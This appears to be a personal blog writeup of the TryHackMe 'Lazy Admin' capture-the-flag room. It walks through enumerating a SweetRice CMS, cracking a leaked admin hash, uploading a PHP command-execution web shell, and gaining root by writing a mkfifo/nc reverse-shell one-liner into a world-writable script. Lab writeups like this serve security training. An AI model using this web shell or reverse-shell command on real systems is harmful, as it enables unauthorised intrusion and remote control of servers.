---
layout: post
title: Lazy Admin
date: 2020-09-23 00:00:00 +5:30
categories: [TryHackMe, Easy]
tags: [tryhackme, hashcracking, wordpress, GTFO] # add tag
---

## Description

The Following Post is writeup of Lazy Admin room of tryhackme <https://tryhackme.com/room/lazyadmin>

|Machine|Detail
|:---|:--
|OS | Linux
|Rating | Easy
|Creator | MrSeth6797

## Summary

The machine have 2 open ports 22 and 80, In port 80 we have sweetrice CMS(on Dirbusting). On searching
for public exploits we found a backup disclosure which contains admin username and password.
We have php code execution in ads tab of sweetrice. www-data can run a script as sudo and have write
rights for thats so putting reverse shell we will get root.

## Walkthrough

### Enumeration

```bash
┌─[argenestel@parrot]─[~/Desktop/lazyadmin]
└──╼ $nmap -sC -sV -oA nmap/lazy 10.10.232.150
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-31 03:48 IST
Nmap scan report for 10.10.232.150
Host is up (0.24s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.24 seconds
```

So let;s see port 80

#### port 80

So we can see few links after the Webpage loaded.
Moving on to dirbust.

```bash
┌─[✗]─[argenestel@parrot]─[~/Desktop/lazyadmin]
└──╼ $ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.232.150/FUZZ

        /'___\  /'___\           /'___\      
       /\ \__/ /\ \__/  __  __  /\ \__/      
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\     
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/     
         \ \_\   \ \_\  \ \____/  \ \_\      
          \/_/    \/_/   \/___/    \/_/      

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.232.150/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10]
content                 [Status: 301, Size: 316, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10]
```

Dirbusting content again.

```bash
┌─[argenestel@parrot]─[~/Desktop/lazyadmin]
└──╼ $ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.232.150/content/FUZZ

        /'___\  /'___\           /'___\      
       /\ \__/ /\ \__/  __  __  /\ \__/      
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\     
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/     
         \ \_\   \ \_\  \ \____/  \ \_\      
          \/_/    \/_/   \/___/    \/_/      

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.232.150/content/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10]
_themes                 [Status: 301, Size: 324, Words: 20, Lines: 10]
as                      [Status: 301, Size: 319, Words: 20, Lines: 10]
attachment              [Status: 301, Size: 327, Words: 20, Lines: 10]
images                  [Status: 301, Size: 323, Words: 20, Lines: 10]
inc                     [Status: 301, Size: 320, Words: 20, Lines: 10]
js                      [Status: 301, Size: 319, Words: 20, Lines: 10]
```

![sweetrice](/assets/img/lazyadmin/sweetrice.png)

![login](/assets/img/lazyadmin/login.png)

So we have sweetrice in /content and login in /content/as.<br/>
Let's check if we can get any info about sweetrice.

![searchsploit](/assets/img/lazyadmin/searchsploit.png)

We can see backup disclosure let's check that output
![backup](/assets/img/lazyadmin/backup.png)

Download the backup and look into it we got admin user and password.
![backup](/assets/img/lazyadmin/sql.png)

![HashCrack](/assets/img/lazyadmin/hashcrack.png)

OK so finally logged in we can see another vulnerability on ads tab in sweetrice which leads to rce.

<https://packetstormsecurity.com/files/139521/SweetRice-1.5.1-Code-Execution.html>

#### Exploitation

so according to packet storm we can exec code using ads feature in sweet rice

![ads](/assets/img/lazyadmin/ads.png)

so i uploaded a simple php shell

```html
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
if(isset($_GET['cmd']))
{
system($_GET['cmd']);
}
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>

</html>
```

let's get a reverse shell

```bash
┌─[argenestel@parrot]─[~/Desktop/tryhackme/lazyadmin]
└──╼ $pwncat --listen --port 4444
[11:07:07] received connection from 10.10.182.220:46374                                                                connect.py:148
[11:07:08] new host w/ hash 0a307a4f181fea16ebb4d9fe234f3689                                                            victim.py:325
[11:07:19] pwncat running in /bin/sh                                                                                    victim.py:358
[11:07:27] pwncat is ready 🐈                                                                                           victim.py:768


(remote) www-data@THM-Chal:/$bash

www-data@THM-Chal:/home/itguy$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

```
so we can edit copy.sh and get root

```bash
www-data@THM-Chal:/home/itguy$ ls -la /etc/copy.sh
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
www-data@THM-Chal:/home/itguy$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.108.114 4443 >/tmp/f" > /etc/copy.sh

┌─[argenestel@parrot]─[~/Desktop/tryhackme/lazyadmin]
└──╼ $pwncat --listen --port 4443
[11:36:23] received connection from 10.10.182.220:42902                                          connect.py:148
[11:36:26] new host w/ hash 0a307a4f181fea16ebb4d9fe234f3689                                      victim.py:325
[11:36:39] pwncat running in /bin/sh                                                              victim.py:358
[11:36:46] pwncat is ready 🐈                                                                     victim.py:768


(remote) root@THM-Chal:/$ bash
root@THM-Chal:/# ls
bin   cdrom  etc   initrd.img      lib         media  opt   root  sbin  srv  tmp  var      vmlinuz.old
boot  dev    home  initrd.img.old  lost+found  mnt    proc  run   snap  sys  usr  vmlinuz
root@THM-Chal:/# cd root/
root@THM-Chal:~# ls
root.txt
root@THM-Chal:~# cat root.txt
```
